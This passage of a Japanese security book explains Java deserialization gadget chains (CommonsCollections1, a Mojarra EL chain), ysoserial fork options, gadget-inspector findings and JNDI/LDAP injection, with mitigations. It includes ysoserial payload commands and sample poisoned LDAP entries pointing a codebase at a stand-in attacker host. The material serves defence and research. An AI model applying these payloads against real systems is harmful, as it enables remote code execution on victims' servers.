2. **`InvokerTransformer("getMethod", {String, Class[]}, {"getRuntime", new Class[0]})`** → 入力 `Runtime.class` に対し `getMethod("getRuntime", 引数なし)` を反射呼び出しし、`Method`（`getRuntime` メソッド）を返す。`getMethod` 自体が `Class` のメソッドなので、入力が `Runtime.class`（Class 型）であることが効いている。
3. **`InvokerTransformer("invoke", {Object, Object[]}, {null, new Object[0]})`** → 入力 `getRuntime` メソッドに対し `invoke(null, 引数なし)` を反射呼び出し。`getRuntime` は static メソッドなので第1引数は `null` でよく、戻り値として `Runtime` インスタンスが得られる。
4. **`InvokerTransformer("exec", {String}, execArgs)`** → 入力 `Runtime` インスタンスに対し `exec(command)` を反射呼び出し。ここで任意コマンドが実行される。

最後の `ConstantTransformer(1)` は末尾の後始末（戻り値を整える）用で、攻撃の本質には関与しない。段階4を終えた時点で、被害者プロセス上で `command` が実行済みになっている。

### なぜこの設計が「巧妙」なのか（原理のまとめ）

CC1 の核心は、**「自動で呼ばれるメソッド」を4回すり替えていく**点にある。

- `readObject` は開発者が意図した「アノテーション復元」のつもりで `memberValues` を触る。
- しかし `memberValues` は動的プロキシで、あらゆる呼び出しが `invoke()` に集約される。
- `invoke()` は `get()` を呼ぶが、その Map は `LazyMap` で、未知キーの `get()` がファクトリ発火に化ける。
- ファクトリは `Transformer` チェーンで、`InvokerTransformer` という「任意メソッド反射呼び出し装置」を通じて `Runtime.exec` に到達する。

各リンクは**それ単体では正当な機能**（アノテーション処理、動的プロキシ、遅延生成Map、汎用変換器）であり、どれもバグではない。攻撃者はこれらを「意図しない順序と組み合わせ」で連結しただけだ。だからこそ「特定のクラスを1つ修正する」対症療法では防ぎきれず、**信頼できないデータを一切デシリアライズしない／許可リスト方式でクラスを制限する**という設計レベルの対策（本書の防御章で詳述）が必要になる。

### 防御の観点での要点

本節はあくまで**防御・検知のための内部理解**を目的としている。実在サービスや本番環境への無許可の検証、破壊的な操作は行ってはならない。CC1 の理解から導かれる防御上の教訓は次の通りだ。

- **ネイティブJavaシリアライズを外部入力に使わない**のが根本対策。JSON など「コードを復元しない」データ形式へ移行する。
- やむを得ず使う場合は、`ObjectInputFilter`（JEP 290、JDK 9+／8u121+ にバックポート）で**デシリアライズ可能なクラスを許可リストで厳格に絞る**。`InvokerTransformer` などの既知ガジェットを含むパッケージを拒否する。
- **依存ライブラリを最新に保つ**。Commons Collections は 3.2.2／4.1 以降で危険な Transformer のデシリアライズをデフォルト無効化した。JDK も 8u72 以降を使う。
- **検知**: `AnnotationInvocationHandler`、`InvokerTransformer`、`ChainedTransformer` などのクラス名がシリアライズストリーム（マジックバイト `AC ED 00 05`、Base64 では多くの場合 `rO0AB` で始まる）中に現れないか監視する。

次節では、CC1 の起点封じ（8u72）を回避するために別の `readObject` を起点として `LazyMap.get()` に到達する後継チェーン（CommonsCollections5／6）を扱い、「1リンクの修正では根絶できない」という本節の教訓を具体的に確認する。

## 現代のガジェット探索と拡張フォーク

前節までで、Javaデシリアライゼーションの脆弱性が「なぜ危険なのか」（`readObject` が任意のクラスの任意のメソッド呼び出し列を誘発できること）と、`CommonsCollections1` に代表される古典的ガジェットチェーンの内部構造を見てきた。本節ではその先――**攻撃者・診断者は実際にどうやって「まだ知られていないガジェットチェーン」を見つけるのか**、そして**既知のツールセットは2015年当時からどう進化したのか**を扱う。素材は次の2つである。

1. `ysoserial`(synacktiv メンテナンスフォーク) ― 攻撃用ペイロード生成ツールそのものの現代的拡張
2. Synacktiv社のブログ「Finding gadgets like it's 2015: part 2」― `gadget-inspector` を使った実戦的なガジェット探索の記録

どちらも「実在サービスへの無許可攻撃」ではなく、防御側が**自分たちの依存ライブラリにどんなガジェットが潜みうるかを把握するための調査手法**として読んでほしい。

### なぜ「新しいガジェットチェーン探し」が今も必要なのか

`ysoserial` オリジナル版（frohoff, 2015年 AppSecCali発表）は `CommonsCollections1〜7`、`Spring1/2`、`Groovy1`、`Hibernate1/2` など既知ライブラリの脆弱バージョンに対応するガジェットチェーンを同梱した、いわば「型」のカタログである。しかし実際の防御・診断の現場では次の問題に直面する。

- 対象アプリケーションのクラスパスには、カタログに載っていない社内ライブラリやマイナーなOSSが大量に含まれている。
- カタログにあるライブラリでも、パッチ済みバージョンでは既知チェーンが通らない（前提となるメソッドが削除・変更されている）。
- 逆に「一見安全に見える新しいバージョン」に、まだ誰も報告していない未知の実行経路（0-dayガジェット）が残っている可能性がある。

つまり `readObject`（Javaでシリアライズされたバイト列を読み込んでオブジェクトを復元する際に自動的に呼ばれる特殊メソッドで、逆シリアル化の**入口 = sink候補の起点**になる）を持つクラスがクラスパス上に大量にある以上、「既知チェーンのカタログを引く」だけでは診断は終わらない。ここで重要になるのが、(a) 攻撃者目線でペイロードを素早く組み立てる実務ツール（ysoserial系フォーク）と、(b) バイトコードを機械的に解析して「まだ知られていない経路」を洗い出す静的解析ツール（gadget-inspector）の2本柱である。

### 1. ysoserial(synacktiv フォーク) ― 実務ペイロード生成の拡張

> 出典: ysoserial (synacktiv maintained fork) — https://github.com/synacktiv/ysoserial

#### 基本設計はオリジナルと同じ

このフォークも土台は frohoff 版 ysoserial であり、コンセプトは変わらない。

```
java -jar ysoserial.jar [payload] [command] | xxd
java -jar ysoserial.jar CommonsCollections1 calc.exe > payload.bin
```

`[payload]` はガジェットチェーンの名前（`CommonsCollections1`〜`7`、`Spring1/2`、`Groovy1`、`Hibernate1/2`、`ROME`、`Vaadin1`、`JSON1`、`URLDNS` など）で、`[command]` はターゲットマシン上で最終的に実行させたいOSコマンドである。ysoserialは指定したガジェットチェーンに従って、`AnnotationInvocationHandler` の動的プロキシや `Transformer` チェーン(Commons Collections)、あるいは `PriorityQueue`/`Hashtable` のようなJava標準コレクション経由のトリガーを使い、最終的に `Runtime.exec()` 等へ到達するオブジェクトグラフをメモリ上に構築し、それを `ObjectOutputStream` でシリアライズしてバイト列として標準出力に吐き出す。診断者はこのバイト列を対象アプリケーションの「デシリアライズ入力点」（HTTPパラメータ、Cookie、メッセージキュー等）に投入して、コマンドが実行されるかを確認する、という使い方になる。

READMEは目的を明確にこう位置づけている――脆弱性の本質は「ガジェットがクラスパスにあること」ではなく「アプリケーションが信頼できない入力を無条件にデシリアライズしていること」にある、という注記がある。これは実務上非常に重要な整理で、**ガジェット（Commons Collectionsなど）を依存関係から除去することは緩和策にはなっても根本対策ではなく、根本対策は「信頼できない入力を逆シリアル化しない」こと自体**だという設計思想がここに表れている。

#### `--inline`：ペイロードに好きなJavaコードを埋め込む

synacktiv フォークが追加した代表的なオプションが `--inline` である。

```
java -jar ysoserial.jar CommonsCollections1 --inline 'System.out.println("Hello world");'
```

オリジナル版は「ガジェットチェーンの最終到達点で `Runtime.exec(command)` を呼ぶ」という固定の挙動しか持たない。しかし実際の診断・研究では、

- OSコマンド実行ではなく、任意の Java 式・文を直接実行させて挙動を観察したい（例: 特定クラスがロードされているか調べる、ファイルシステムではなくメモリ上の値を書き換える等）
- OS非依存の副作用（DNSクエリの発行、静的フィールドの書き換えなど）を起こしたい
- WAF や EDR が `Runtime.exec` 呼び出しパターンを検知するため、それを経由しない任意コード実行を試したい

といった要求が生まれる。`--inline` は、ガジェットチェーンの最終段（sink）に固定コマンドではなく**任意のJavaソースコード断片をその場でコンパイルして注入する**ことを可能にする。仕組みとしては、渡された文字列を一時的な `.java` ファイルにラップしてJavaコンパイラAPI（`javax.tools.JavaCompiler`）等でコンパイルし、生成されたバイトコードをガジェットチェーンの実行対象クラスとして差し替える、という流れになる。これにより「固定コマンド文字列」ではなく「任意の振る舞いをするクラス」を逆シリアル化のペイロードに埋め込めるため、単なるPoC実証を超えて、脆弱性の深掘り調査（サンドボックス回避の検証、副作用の異なる検知回避テストなど）に使える柔軟性が生まれる。

#### `--jar-file` / `--jar-main`：対象アプリケーション固有のクラスを直接使う

もう一つの拡張が、ターゲットアプリケーション自身のJARを取り込んでペイロードをカスタマイズする仕組みである。

```
java -jar ysoserial.jar SomeGadget --jar-file /path/to/target-app.jar --jar-main org.example.Main ...
```

汎用ガジェットチェーン（Commons CollectionsやSpringなど公開ライブラリ由来のもの）は「そのライブラリの脆弱バージョンがクラスパスにある場合」にしか使えない。しかし実際の対象システムには、社内フレームワークや独自ライブラリ内にしか存在しない `readObject`/`equals`/`hashCode` 経由の危険な呼び出し連鎖（ガジェット）が存在することがある。`--jar-file` で対象アプリのJARをysoserialに読み込ませ、`--jar-main` でそのJAR内のエントリポイントとなるクラスを指定することで、汎用ライブラリのガジェットに頼らず、**対象固有のクラスをガジェットチェーンの部品として組み込んだペイロード**を生成できる。これは次項で紹介する `gadget-inspector` による静的解析で「対象アプリ固有の未知ガジェット」を発見した後、それを実際に動くペイロードへと落とし込む工程で必要になる機能であり、「探索ツールで経路を見つける → 実務ツールでペイロード化する」という一連のワークフローの後半を担っている。

#### メンテナンスの位置づけ

frohoff によるオリジナル `ysoserial` は長らく更新が停滞していたため、コミュニティにはBishopFoxをはじめ複数のメンテナンスフォークが存在する。synacktiv フォークもその一つで、上記の `--inline` や `--jar-file`/`--jar-main` に加えて、新しいガジェットチェーンの追加やJava新バージョンへの対応（依存ライブラリのビルド不整合の修正など）を行っている点が特徴である。ビルドは Java 1.7+ と Maven 3.x を前提とし、`mvn clean package -DskipTests` でオールインワンJAR（`ysoserial-all.jar`)を生成する。バージョン依存の注意点として、`javax.interceptor-api` の特定バージョン（3.1系）とのビルド競合が報告されている点は執筆時点(2026年)でも留意事項として残っている。読者が実際に利用する際は、フォーク間でオプション名や追加ガジェットの有無が異なるため、使用するフォークのREADMEとリリースノートを都度確認することが望ましい。

> ⚠️ **未取得の資料に関する補足**: GitHubページの自動取得では、要約された概要は得られたものの、収録ガジェットチェーンの完全な一覧、各コミットの変更履歴、issueでの議論までは取得できていません。正確な最新の対応ガジェット一覧やオプション仕様は、リポジトリを直接ご覧ください: https://github.com/synacktiv/ysoserial

### 2. gadget-inspector によるガジェット探索 ― Synacktiv "Finding gadgets like it's 2015: part 2"

> 出典: Synacktiv, Finding gadgets like it's 2015: part 2 — https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2015-part-2.html

#### gadget-inspector とは何か、なぜ必要か

`gadget-inspector` は Ian Haken が Black Hat USA 2018 で発表したオープンソースの静的解析ツールで、JARやWARファイル一式を入力として、**Javaバイトコードを解析し「デシリアライズ起点(`readObject`など)から危険なメソッド呼び出し(sink)まで到達しうる呼び出し連鎖の候補」を自動列挙する**ものである。人手でJavaライブラリのソースを1クラスずつ読んで「このメソッドから次にどのメソッドが呼ばれるか」を追うのは現実的な規模ではできない――対象アプリのクラスパスには数百のJARが含まれることが珍しくないため、機械的なコールグラフ解析が必須になる。

この記事の事例では、対象アプリケーションのクラスパスに **637個のJARファイル** が含まれており、これを一晩かけて `gadget-inspector` にバッチ処理させ、翌朝に候補となる呼び出し連鎖の一覧を得る、という現実的なワークフローが取られている。これは「大量の依存ライブラリを持つ実アプリケーションに対して、既知カタログにない未知ガジェットを探す」場合の典型的な進め方である。

#### 自動化だけでは足りない ― false positive の壁

記事が明確に指摘する重要な限界は次の点である。

> gadget inspector が「興味深い」と判定する関数呼び出しの条件は非常に広く取られており、分岐条件が実際に成立しうるか（satisfiability）までは検証しない。

つまり `gadget-inspector` はバイトコード上「メソッドAがメソッドBを呼びうる」という**静的な到達可能性**は洗い出せるが、「実際にその分岐に入る値がフィールドとして注入可能か」「その条件式が逆シリアル化中に本当に真になりうるか」までは判定しない。このため出力には大量の false positive（実際には悪用できない経路の誤検出）が混ざる。

記事中の具体例として、`log4j` の `readObject` がツールによって「興味深い」と一旦フラグ立てされたケースが挙げられている。しかし手作業で追跡すると、そこから呼ばれるのは `toLevel` という**静的メソッド**の呼び出しに限られており、それ以上任意のオブジェクトメソッド呼び出しへ展開できないことが判明し、これは悪用不可能な誤検出だと結論づけられている。また、`javax/el/ELProcessor.eval` のような「危険な最終到達点(sink)」をカスタムでツールに追加登録しても、637ライブラリ全体からは新たに悪用可能な経路が見つからなかった、という点も記録されている。**つまり自動化ツールをどれだけチューニングしても、それだけでは実用的な新規ガジェットチェーンの発見には至らなかった**、というのがこの調査の重要な教訓である。

#### 手動解析による発見 ― Mojarra (JSF) のガジェットチェーン

自動探索が手詰まりになった後、研究者はEclipse Mojarra(JSFのリファレンス実装)のソースコードを手動でレビューし、`UIComponentBase$AttributesMap` クラスの `get()` メソッドに着目した。最終的に発見されたチェーンは次のような呼び出し連鎖である。

```
java.util.Hashtable.readObject
  → java.util.Hashtable.reconstitutionPut
    → java.util.Hashtable.equals
      → javax.faces.component.UIComponentBase$AttributesMap.get
        → javax.faces.component.UIComponent.getValueExpression
        → javax.el.ValueExpression.getValue
```

**なぜこの連鎖が起動するのか（仕組みレベルの説明）**

1. `Hashtable` は `readObject` の中で、シリアライズされていたキー・バリューのペアを1つずつ `reconstitutionPut` というメソッドで内部テーブルへ再構築する。
2. `reconstitutionPut` は、ハッシュ値が衝突した既存エントリのキーと、新しく読み込んだキーが「本当に同じキーか」を確認するために `equals()` を呼び出す。ここが古典的な `HashMap`/`Hashtable` 系ガジェットの共通パターンで、**攻撃者は「ハッシュ値が意図的に衝突するペア」を細工することで、通常はアプリケーションコードからしか呼ばれないはずの `equals()` を逆シリアル化中に強制的に起動できる**。
3. この `equals()` の比較対象として、通常の `Hashtable` オブジェクトと、JSFの `AttributesMap`（コンポーネントの属性を保持するMap実装）のペアを仕込む。`AttributesMap` 側の `equals()`(実質的に `get()` 経由の比較ロジック)は、キーに対応する値を取得する過程で `getValueExpression()` を呼び出す。
4. `getValueExpression()` は JSF の式言語(EL, Expression Language)オブジェクトである `ValueExpression` を返す。これに対して `getValue()` を呼ぶと、**そのValueExpressionにあらかじめ仕込んでおいたEL式文字列が評価・実行される**。EL式はJSFやJSP等で `#{...}` の形で使われる簡易スクリプト言語で、内部的にはメソッド呼び出しやプロパティアクセスを表現でき、細工次第で任意のJavaメソッド呼び出し(＝実質的な任意コード実行)にまで到達しうる。

つまりこのチェーンは「無害に見えるコレクションの内部実装(`Hashtable`のハッシュ衝突処理)」と「JSFのEL評価機構」という、**本来無関係な2つの正規機能を組み合わせる(chaining)ことで、初めて危険な sink に到達する**という、ガジェットチェーンの本質そのものを体現した好例である。

#### 実装上の落とし穴：クラスロード順とダミーオブジェクト

このチェーンを実際に動かそうとすると、`WeldValueExpression`(CDI/Weld環境でのValueExpression実装クラス)がまだJVMにロードされていない状態で `readObject` が走ると `ClassNotFoundException` が発生し、チェーンが途中で失敗する問題があった。これは逆シリアル化がJavaの通常のクラスロード機構(`ClassLoader`)に依存しており、**あるクラスへの参照を含むオブジェクトを復元しようとした瞬間に、そのクラスがまだロードされていなければ例外になる**という、JVMの一般的な制約に起因する。

対策として、ペイロードの中に「本来のチェーンには関与しない、ダミーの `ValueExpression` オブジェクト」を追加で仕込んでおくという工夫が使われている。これによりデシリアライズの早い段階で該当クラスが一度ロードされ、後段の本命チェーンが実行される時点ではクラスローダーの準備が整っている状態になる。**ガジェットチェーンを作る際は「呼び出し可能かどうか」だけでなく「必要なクラスが実行時点で確実にロード済みか」という、地味だが致命的になりうる前提条件のケアが必要である**という実務上の教訓がここに現れている。

#### スコープの限界

このチェーンは Eclipse Mojarra(JSFのリファレンス実装) の 2.3系 および 3.0系 で動作が確認されている一方、同じJSF仕様のもう一つの実装である Apache MyFaces では動作しないと記事は明記している。理由は両実装で `UIComponent` のシリアライズ処理の内部設計が異なるためであり、**同一の公開仕様(JSF)に準拠したライブラリであっても、実装依存でガジェットの成否が変わる**ことを示す実例になっている。これは診断者にとって「ライブラリ名とバージョンだけでなく、具体的な実装(ベンダー)まで正確に特定しなければガジェットの適用可否を判断できない」という重要な示唆を持つ。

### この節の要点整理

- 既知ガジェットチェーンのカタログ(`ysoserial` 系)は診断の出発点にすぎず、対象システム固有の未知ガジェットは静的解析(`gadget-inspector`など)と手動レビューの組み合わせでしか見つからないことが多い。
- 静的解析ツールは「呼び出し可能性」を機械的に洗い出せるが、条件分岐の実際の成立可能性までは検証しないため、大量の false positive を人間が選別する工程が不可欠である。
- 発見したガジェットチェーンを実際のペイロードとして組み立てる段では、`ysoserial` の `--inline`(任意コード注入)や `--jar-file`/`--jar-main`(対象固有クラスの取り込み)のような拡張機能が、汎用ガジェット頼みでは対応できないケースを埋める。
- ガジェットチェーンは「一見無害な標準ライブラリの内部処理(ハッシュ衝突時の`equals`呼び出しなど)」と「危険な最終到達点(EL評価など)」の組み合わせで初めて成立するため、防御側はライブラリ単位ではなく**呼び出しグラフ全体**でリスクを評価する視点が必要になる。
- こうした調査・ツールは、自組織や自社アプリケーションの依存関係の安全性を評価する目的でのみ利用し、権限のない第三者システムへの適用は行ってはならない。

## JNDI/RMI/LDAP経由のRCEとLog4Shell

Javaのデシリアライゼーション攻撃を学ぶと必ず突き当たるのが**JNDIインジェクション**である。これは「悪意あるバイト列を`readObject()`に流し込む」古典的なガジェットチェーンとは少し毛色が違う。攻撃者が直接送り込むのは**ただのURL文字列**であり、そのURLをアプリケーションが`lookup()`しただけで、遠隔サーバから取得されたJavaオブジェクトが再構築され、最終的に任意コード実行（RCE）へ至る。2021年末に世界を揺るがした**Log4Shell（CVE-2021-44228）**は、まさにこのJNDIインジェクションを「ログ文字列」という誰もが信頼しきっていた経路から発火させた事件だった。

本節では、まずJNDIという仕組みそのものを分解し、なぜ「URLを1本渡すだけ」でコードが動くのかを**Naming Manager（命名マネージャ）の内部実装レベル**で解き明かす。そのうえでLog4Shellがどうやってこの古い問題を再点火したのか、そしてJDK側の緩和策（`trustURLCodebase`）が効いてもなおRCEが成立する「ローカルガジェット」の世界までを扱う。攻撃コードそのものを組み立てる手順は示さず、**なぜそうなるのか＝防御のためにどこを塞ぐべきか**に焦点を当てる。

---

### JNDIとは何か —— 名前からオブジェクトを引く共通API

**JNDI（Java Naming and Directory Interface）**は、さまざまな「命名サービス（Naming Service）」や「ディレクトリサービス（Directory Service）」に対して、統一されたAPIでアクセスするための抽象化レイヤである。

- **命名サービス**とは、名前と値を結びつける（この結びつきを**バインディング（binding）**と呼ぶ）実体で、名前を手がかりにオブジェクトを探す`lookup`（検索）操作を提供する。
- **ディレクトリサービス**は命名サービスの特殊形で、格納するオブジェクトに**属性（attribute）**を付けられる。名前だけでなく属性による`search`（検索）ができる。

JNDIの構造は4層になっている。上から順に「Javaアプリケーション」→「JNDI API」→「Naming Manager（命名マネージャ。コンテキストやオブジェクトを生成する静的メソッド群を持つ）」→「JNDI SPI（Service Provider Interface）」であり、SPIの下に **LDAP・DNS・NIS・NDS・RMI・CORBA** といった具体的なバックエンドがぶら下がる。つまりJNDIは「どのプロトコルでオブジェクトを取ってくるか」を差し替え可能にした、いわばプラグイン機構である。

```java
// RMIレジストリと会話するInitialContextを作る例（Black Hat 2016スライドより）
Hashtable env = new Hashtable();
env.put(INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(PROVIDER_URL, "rmi://localhost:1099");
Context ctx = new InitialContext(env);

// 名前 "foo" に文字列をバインドし、あとで引く
ctx.bind("foo", "Sample String");
Object local_obj = ctx.lookup("foo");
```

`PROVIDER_URL`を`ldap://localhost:389`（`INITIAL_CONTEXT_FACTORY`は`com.sun.jndi.ldap.LdapCtxFactory`）に変えれば、同じAPIでLDAPを相手にできる。この**「バックエンドをURLで切り替えられる」**設計こそが、後述する攻撃の入口になる。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### Naming References —— 「オブジェクトの作り方」をディレクトリに置く

Javaオブジェクトをディレクトリに格納する素直な方法は、`java.io.Serializable`でシリアライズしてバイト列として保存することだ。しかしオブジェクトグラフが巨大すぎたり、シリアライズが不適切だったりする場合がある。そこでJNDIは**Naming Reference（命名参照）**という仕組みを用意した。これは「オブジェクトそのもの」ではなく「オブジェクトを作るための指示書」を格納するものである。Referenceは主に次の情報を持つ。

- **Reference Address**: オブジェクトのアドレス（例: `rmi://server/ref`）
- **Remote Factory（リモートファクトリ）**: オブジェクトを生成する**ファクトリクラスの名前**と、その**クラスファイルの置き場所（Codebase）**

ここが攻撃の核心だ。lookupの結果としてReferenceが返ってきたとき、クライアント側のNaming Managerは「ファクトリクラスをロードして`newInstance()`する」ことでオブジェクトを組み立てる。そのファクトリクラスが**手元のクラスパスに無ければ、Referenceに書かれたCodebase（＝任意のURL）からダウンロードして読み込む**のである。攻撃者がReferenceを制御できれば、Codebaseを自分のHTTPサーバに向けられる。

Naming Managerの復号（デコード）ロジックの実物が以下だ。

```java
// NamingManager.getObjectFactoryFromReference の抜粋（JDK内部コード）
static ObjectFactory getObjectFactoryFromReference(Reference ref, String factoryName) {
    Class clas = null;
    // まず現在のクラスローダで探す ...
    // クラスパスに無ければ codebase を使ってロードを試みる
    String codebase;
    if (clas == null && (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase);   // ← 遠隔からクラスをロード
        } catch (ClassNotFoundException e) {}
    }
    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;  // ← インスタンス化＝コード実行
}
```

`ref.getFactoryClassLocation()`が攻撃者の`http://attacker-server/`を返し、`helper.loadClass()`がそこからバイトコードをフェッチする。読み込まれたクラスの`newInstance()`が呼ばれた瞬間、そのクラスの静的初期化子やコンストラクタに仕込まれたコードが**被害者JVM上で**動く。これが「URLを渡すだけでRCE」の正体である。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### 攻撃の全体像と「動的プロトコル切り替え」

Munoz & Miroshが整理したJNDIインジェクションの流れは5ステップである。

1. 攻撃者が自分の命名/ディレクトリサービスにペイロード（悪意あるReference等）をバインドしておく。
2. 攻撃者が脆弱なlookupメソッドに**絶対URL**を注入する。
3. アプリがそのlookupを実行する。
4. アプリが攻撃者制御のサービスへ接続し、ペイロードを受け取る。
5. アプリがレスポンスをデコードし、ペイロードが発火する。

決定的に重要なのは、`javax.naming.InitialContext`（およびその子クラス`InitialDirContext`／`InitialLdapContext`）の`lookup()`が、**引数に絶対URLが与えられると、その場でプロトコルとプロバイダを動的に切り替える**という挙動だ。

```java
// アプリはローカルのRMIレジストリを想定していても……
env.put(PROVIDER_URL, "rmi://secure-server:1099");
Context ctx = new InitialContext(env);

// lookupの引数が攻撃者制御なら、ここで別プロトコル・別サーバに飛ばされる
Object local_obj = ctx.lookup( <attacker-controlled> );
```

`lookup()`の引数として`rmi://attacker-server/bar`、`ldap://attacker-server/cn=bar,dc=test,dc=org`、`iiop://attacker-server/bar`のいずれかを渡せば、設定された`PROVIDER_URL`を無視して攻撃者のサーバへ接続してしまう。したがって**「lookupの名前部分にユーザ入力が混じる」ことが根本的な脆弱性**である。スライドの言葉を借りれば "Applications should not perform JNDI lookups with untrusted data"（アプリは信頼できないデータでJNDIルックアップを行ってはならない）。

Munoz & Miroshは、RCEに至る主要ベクタを **RMI・CORBA・LDAP** の3系統に整理した。それぞれ「JNDI Reference」「シリアライズ済みオブジェクト」「IOR」などのサブベクタを持つ。なお`lookup`の引数が直接ユーザ入力でなくとも、**デシリアライゼーション攻撃の途中でlookupを呼ぶガジェット**を経由して到達することもある。スライドが挙げる実例が次だ。

- `org.springframework.transaction.jta.JtaTransactionManager`（@zerothinking）
- `com.sun.rowset.JdbcRowSetImpl.execute()`（@matthias_kaiser）
- `javax.management.remote.rmi.RMIConnector.connect()`
- `org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String)`

これらは「デシリアライズ時にフィールド値を使ってJNDI lookupを行う」性質を持つため、**デシリアライゼーション → JNDIインジェクション → 遠隔クラスロード → RCE**という連鎖の中継点になる。第3章で扱ったガジェットチェーンとJNDIが地続きであることがよく分かる。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### RMI・LDAP・CORBAで遠隔クラスロードが許される条件

「遠隔からクラスをロードする」動作は、実はコンポーネントごとに可否と条件が違う。Black Hat 2016スライドの表を再構成すると次のようになる。

| コンポーネント | 遠隔クラスロードを有効にするJVMプロパティ | SecurityManagerの強制 |
|---|---|---|
| RMI (SPI) | `java.rmi.server.useCodebaseOnly = false` （**JDK 7u21以降のデフォルトは `true`**） | 常に強制 |
| LDAP (SPI) | `com.sun.jndi.ldap.object.trustURLCodebase = true` （**デフォルトは `false`**） | 強制されない |
| CORBA (SPI) | — | 常に強制 |
| Naming Manager | — | 強制されない |

この表の読み方が防御上きわめて重要である。

- **RMIとCORBA**は、遠隔クラスロード時に必ず**SecurityManager**によるチェックが入る。つまりポリシー設定がまともなら、ダウンロードしたクラスは危険な権限を持てず、実害を抑えられる。ただしSecurityManagerが（デフォルトのように）無効なアプリでは、このガードは効かない。逆に、**SecurityManagerを有効にしても不適切なPolicyファイルだと、CORBA/IIOPリスナー経由で「untrusted」コードに`java.security.AllPermission`が与えられ、かえってRCEの裏口を開く**ことがある、とスライドは警告している。
- **LDAP**は歴史的に、遠隔クラスロードに際して**SecurityManagerの強制が入らない**。そのため`trustURLCodebase`がtrueなら無条件にRCEへ直行しやすく、JNDIインジェクションで最も好まれるベクタだった。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### LDAPエントリポイズニング —— lookupしていなくても危ない

RMIベクタは「攻撃者が自前のRMIレジストリを立て、Reference返却でクラスロードさせる」構図だった。LDAPには、それに加えてもっと厄介な**Entry Poisoning（エントリポイズニング）**がある。攻撃者がlookupの引数を制御できなくても、**LDAPエントリの内容を書き換えられる／LDAPレスポンスを改ざんできる**だけでRCEが成立しうるのだ。

仕組みは**RFC 2713「Java Schema」**にある。このRFCは、JavaオブジェクトをLDAPディレクトリに格納するための属性を定義している。

- **シリアライズ済みオブジェクト（javaSerializedObject）**: `javaClassName`, `javaCodebase`, `javaSerializedData`
- **JNDI参照（javaNamingReference）**: `javaClassName`, `javaCodebase`, `javaReferenceAddress`, `javaFactory`
- **Marshalled Object（javaMarshalledObject）**、**Remote Location（廃止扱い）**なども存在

LDAPの`search`はデフォルトで属性を返すだけの無害な操作に見える。しかし`SearchControls.setReturningObjFlag(true)`が呼ばれていると事情が一変する。JavaDocはこう述べる——「検索がエントリのオブジェクト返却を要求していた場合、`SearchResult`はエントリを表すオブジェクトを含む。もし過去に`java.io.Serializable`, `Referenceable`, `Reference`オブジェクトがそのLDAP名にバインドされていたなら、**エントリの属性を使ってそのオブジェクトを再構築する**」。JDK内部の`com.sun.jndi.ldap.LdapSearchEnumeration`／`LdapBindingEnumeration`のコードで言えば次の分岐である。

```java
// 返却オブジェクトが要求されているときだけオブジェクトを生成
if (searchArgs.cons.getReturningObjFlag()) {
    if (attrs.get(Obj.JAVA_ATTRIBUTES[Obj.CLASSNAME]) != null) {
        // エントリが Java-object 属性（ser/ref object）を含む場合
        obj = Obj.decodeObject(attrs);   // ← ここで属性からオブジェクトを復元
    }
    if (obj == null) {
        obj = new LdapCtx(homeCtx, dn);
    }
}
```

つまり、`javaClassName`属性が存在するだけで`Obj.decodeObject(attrs)`が呼ばれ、シリアライズ済みデータのデシリアライズや、Referenceのファクトリクラスロードが走る。**汚染されたエントリの例**（防御理解のための構造）は次の通り。

シリアライズ済みオブジェクトによるポイズニング:
```
ObjectClass: inetOrgPerson
UID: john
javaSerializedData: ACED01A43C4432FEEA1489AB89EF11183E499...   ← シリアライズ済みガジェット
javaCodebase: http://attacker-server/
javaClassName: DeserializationPayload
```
`javaSerializedData`はデシリアライズされるので、**クラスパス上にガジェットチェーン（例: CommonsCollections）があれば`trustURLCodebase`がfalseでもRCEになりうる**。スライドは明言する——`com.sun.jndi.ldap.object.trustURLCodebase`がtrueなら攻撃者は自前クラスを持ち込め、falseでも**クラスパス上の既存ガジェットを使える**。

JNDI参照によるポイズニング:
```
ObjectClass: inetOrgPerson, javaNamingReference
javaCodebase: http://attacker-server/     ← ファクトリクラスの置き場所
JavaFactory: Factory                      ← ファクトリクラス名
javaClassName: MyClass
```
こちらは前述のReferenceデコード経路で遠隔クラスロードに至る（ただしLDAP遠隔ロードは`trustURLCodebase`に依存）。

この攻撃が現実的になるシナリオとして、スライドは**Rogue employees（LDAP書き込み権を持つ内部者）／脆弱なLDAPサーバ／書き込み権を持つアプリの資格情報／LDAP用のWeb API（REST・SOAP・DSML）／緩いLDAP ACL／SSO・IdP連携**を挙げる。攻撃の発火方法も、エントリを直接汚染する**Entry Manipulation**と、通信を横取りしてレスポンスを差し替える**MiTM Tampering**の2通りがある。デモ対象は`FilterBasedLdapUserSearch.searchForUser(String username)`を使う**spring-security-ldap**で、バージョン**3.2.0以降**は`buildControls()`が内部で`returningObjFlag`をtrueにするため、認証のためにユーザ属性を引くだけでオブジェクト復元経路に入ってしまう、というものだった。

> 出典: Munoz & Mirosh, "A Journey From JNDI/LDAP Manipulation to RCE" (Black Hat USA 2016) — https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

---

### Log4Shell —— ログ文字列がJNDIインジェクションになる

